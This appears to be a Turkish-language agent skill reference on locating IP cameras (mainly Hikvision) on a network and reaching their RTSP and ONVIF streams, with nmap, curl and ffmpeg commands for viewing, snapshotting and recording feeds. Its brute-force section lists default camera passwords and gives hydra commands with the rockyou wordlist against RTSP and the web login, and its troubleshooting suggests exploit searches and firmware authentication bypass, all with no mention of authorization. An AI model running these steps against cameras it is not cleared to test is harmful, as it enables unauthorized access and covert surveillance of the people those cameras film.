
> **Kategori:** Windows

---

## 📋 5N1K

| Soru | Cevap |
|:-----|:------|
| **Kim?** | Windows ajanı |
| **Ne?** | Windows Automation_Ag Taramasi Arp Vs Nmap_References_Kamera Tespit Rtsp Onvif |
| **Nerede?** | Windows/ |
| **Ne Zaman?** | İhtiyaç duyulduğunda |
| **Neden?** | Otomatik kategorilendirme |
| **Nasıl?** | Skill referansı ile |

---

# Agdaki Guvenlik Kameralarini Tespit ve RTSP/ONVIF Kesfi

Bu referans, agdaki IP kameralari (ozellikle Hikvision) tespit etme, RTSP akis testi ve ONVIF kesfi icin adimlari icerir.

## Kamera Tespiti

### 1. Ag Tarama ile MAC Vendor Tespiti

```bash
# Hizli tarama ile tum cihazlari bul
sudo arp-scan --interface eth1 --localnet

# Vendor bilgisi ile dogrula
sudo nmap -sn 192.168.0.0/24
```

Bilinen kamera MAC vendor'lari:
- **Hikvision**: E0:BA:AD, 00:25:9B, 04:13:8E, 14:A3:22, 24:4B:FE, 2C:5A:03
- **Dahua**: AC:CC:87, 30:0E:55, 3C:EF:8E, 54:36:9B, 88:35:4F
- **Axis**: 00:40:8C, AC:CC:8E
- **TP-Link (kamera)**: 30:47:4A, 50:C7:BF
- **Reolink**: 9A:A1:A4, 32:1A:1A

### 2. Port Taramasi (Bilinen Kamera Portlari)

```bash
# RTSP portu
nmap -p 554 <kamera-ip>

# HTTP web arayuzu
nmap -p 80,443 <kamera-ip>

# ONVIF servisleri
nmap -p 3702,5000,5001,7501,8899 <kamera-ip>

# Diger kamera portlari
nmap -p 8000,8080,8554,9000,9090 <kamera-ip>

# Tum portlar (yavas ama kapsamli)
nmap -p- <kamera-ip>
```

Bilinen kamera portlari:
| Port | Protokol | Aciklama |
|------|----------|----------|
| 554 | TCP/UDP | RTSP (Real Time Streaming Protocol) |
| 80 | TCP | HTTP web arayuzu |
| 443 | TCP | HTTPS web arayuzu |
| 3702 | UDP | WS-Discovery (ONVIF) |
| 5000 | TCP | ONVIF servis |
| 5001 | TCP | ONVIF secure |
| 7501 | TCP | Hikvision ONVIF |
| 8000 | TCP | http-alt (Hikvision SDK) |
| 8080 | TCP | Alternatif HTTP |
| 8554 | TCP | Alternatif RTSP |
| 8899 | TCP | ONVIF |
| 9000 | TCP | RTSP alternatif |

## RTSP Baglantisi

### 1. Temel RTSP Test (curl ile)

```bash
# OPTIONS istegi — baglanti dogrulama
curl -v rtsp://admin:admin@192.168.0.17:554/ 2>&1 | grep -E "RTSP|200|401|Unauthorized"

# Yalnizca OPTIONS yaniti
printf "OPTIONS rtsp://192.168.0.17:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n" | nc -w 3 192.168.0.17 554
```

**Not:** curl RTSP OPTIONS basarili olsa bile (`200 OK`), bu sunucunun RTSP protokolunu kabul ettigi anlamina gelir, dogru sifre anlamina DEGIL.

### 2. RTSP Stream URL Desenleri

Bilinen Hikvision RTSP URL desenleri:

```
# En yaygin (Hikvision)
rtsp://admin:sifre@192.168.0.17:554/Streaming/Channels/101
rtsp://admin:sifre@192.168.0.17:554/h264/ch1/main/av_stream
rtsp://admin:sifre@192.168.0.17:554/mpeg4/ch1/main/av_stream
rtsp://admin:sifre@192.168.0.17:554/h264/ch1/sub/av_stream

# Dahua / digerleri
rtsp://admin:sifre@192.168.0.17:554/cam/realmonitor?channel=1&subtype=0
rtsp://admin:sifre@192.168.0.17:554/axis-media/media.amp
rtsp://admin:sifre@192.168.0.17:554/live
rtsp://admin:sifre@192.168.0.17:554/video1
rtsp://admin:sifre@192.168.0.17:554/video/1
rtsp://admin:sifre@192.168.0.17:554/1
rtsp://admin:sifre@192.168.0.17:554/media/video1
```

### 3. ffprobe ile Stream Dogrulama

```bash
# Hizli test — yalnizca stream metadata'sini al
ffprobe -rtsp_transport tcp -timeout 3000000 -i "rtsp://admin:sifre@192.168.0.17:554/Streaming/Channels/101" 2>&1 | head -20

# -timeout degeri: milisaniye cinsinden (3000000 = 3 sn)
# Basarili: Input #0, h264, ... seklinde cikti
# Basarisiz: 401 Unauthorized veya Connection timeout
```

### 4. ffplay ile Canli Izleme

```bash
# Dogrudan goruntu akisi (Kali terminalinde)
ffplay -rtsp_transport tcp -i "rtsp://admin:sifre@192.168.0.17:554/Streaming/Channels/101"

# Window'da gostermesi icin
ffplay -rtsp_transport tcp -x 640 -y 480 -i "rtsp://admin:sifre@192.168.0.17:554/Streaming/Channels/101"
```

### 5. Snapshot Alma

```bash
# Tek kare (JPEG)
ffmpeg -rtsp_transport tcp -i "rtsp://admin:sifre@192.168.0.17:554/Streaming/Channels/101" -vframes 1 -y /tmp/snapshot.jpg 2>&1

# 10 saniyelik kayit
ffmpeg -rtsp_transport tcp -i "rtsp://admin:sifre@192.168.0.17:554/Streaming/Channels/101" -t 10 -c copy /tmp/kayit.mp4 2>&1
```

## ONVIF Kesfi

### 1. ONVIF Device Discovery

```bash
# ws-discover ile broadcast
sudo nmap --script broadcast-wsdd-discover 2>&1 | grep -A5 "WS-Discovery"

# ONVIF port taramasi
nmap -p 3702,5000,5001,7501,8899 <kamera-ip>
```

### 2. ONVIF Web Servisi

```bash
# ONVIF device service URL
curl -v http://admin:admin@192.168.0.17:80/onvif/device_service 2>&1

# ONVIF cihaz bilgisi
curl -X POST http://admin:admin@192.168.0.17:80/onvif/device_service \
  -H "Content-Type: application/soap+xml" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
  xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <soap:Body>
    <tds:GetDeviceInformation/>
  </soap:Body>
</soap:Envelope>' 2>&1
```

### 3. ONVIF Port Durumlari

- **3702 filterli**: WS-Discovery UDP paketleri engelleniyor
- **5000/5001 filterli**: ONVIF servis erisime kapali
- **7501 filterli**: Hikvision spesifik ONVIF erisime kapali
- **8899 filterli**: ONVIF alternatif erisime kapali

Eger tum ONVIF portlari filtered ise, kamera ONVIF'i bloke ediyor veya guvenlik duvari arkasi.

## Web Arayuzu Kesfi

### 1. HTTP/HTTPS Dogrulama

```bash
# Web sayfasi
curl -s -o /dev/null -w "%{http_code}" http://192.168.0.17/

# ISAPI (Hikvision API)
curl -s -o /dev/null -w "%{http_code}" http://192.168.0.17/ISAPI/System/deviceInfo
```

HTTP kodlari:
- **200**: Acik, icerik donuyor
- **301/302**: Yonlendirme var
- **401**: Kimlik dogrulama gerekli (ONVIF servisi calisiyor)
- **404**: Sayfa bulunamadi (farkli URL yapisi)
- **403**: Yasakli erisim

## Sifre Brute Force

### 1. El ile Deneme

```bash
# Her bir sifreyi ayri ayri dene
ffprobe -rtsp_transport tcp -timeout 3000000 -i "rtsp://admin:sifre@192.168.0.17:554/Streaming/Channels/101" 2>&1 | grep -c "Unauthorized"
# 0 = basarili, 1 = basarisiz
```

### 2. Yaygin Hikvision Varsayilan Sifreler

```
admin/admin
admin/12345
admin/123456
admin/admin123
admin/hikvision
admin/hikvision123
admin/2022
admin/112233
admin/888888
admin/666666
admin/abcd1234
admin/password
admin/111111
admin/000000
admin/1234567890
admin/1234
admin/11111111
admin/222222
admin/333333
admin/444444
admin/555555
admin/777777
admin/999999
admin/198012
admin/200808
```

### 3. Hydra ile Toplu Deneme

```bash
# RTSP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 rtsp://192.168.0.17

# HTTP brute force (Hikvision form)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.17 http-get /ISAPI/Security/sessionLogin?username=^USER^&password=^PASS^
```

## Sorun Giderme

### RTSP 401 Unauthorized (Tum Sifreler Basarisiz)
- Sifre gercekten degistirilmis
- Hesap kilitlenmis olabilir (birkaç dakika bekle)
- Kamera RTSP auth modu degistirilmis (Digest vs Basic)
- `--rtsp_transport tcp` flag'ini dene (UDP bazen 401 tetikler)
- Farkli kullanci adi dene: `root`, `user`, `operator`, `viewer`

### 401'dan Kacmak Icin Alternatifler
- **SADP aracı**: Hikvision'un kendi aracı, aynı subnet'teki kamerayı bulup şifre sıfırlayabilir (fiziksel erişim gerekebilir)
- **CVE taraması**: `searchsploit hikvision` veya belirli model numarası
- **Reset butonu**: Kamerada fiziksel reset (genelde 10 sn basılı tut)
- **Firmware exploit**: Eski firmware'lerde auth bypass
- **NVR üzerinden erişim**: Kamera bir NVR'a bağlıysa, NVR üzerinden stream alınabilir

### ffprobe Sessiz Donuyor (Cikti Yok)
- Stream URL yanlis
- Auth basarisiz ama hata mesaji gosterilmiyor
- `2>&1` ile stderr'i de yakala

### ffplay Gostermiyor (SSH Uzerinden)
- Kali'de X11 yoksa ffplay goruntu gosteremez
- Cozum: Snapshot al (ffmpeg -vframes 1) veya kayit yap (ffmpeg -t 10)
- Alternatif: Windows'a dosya aktarip orada ffplay ac
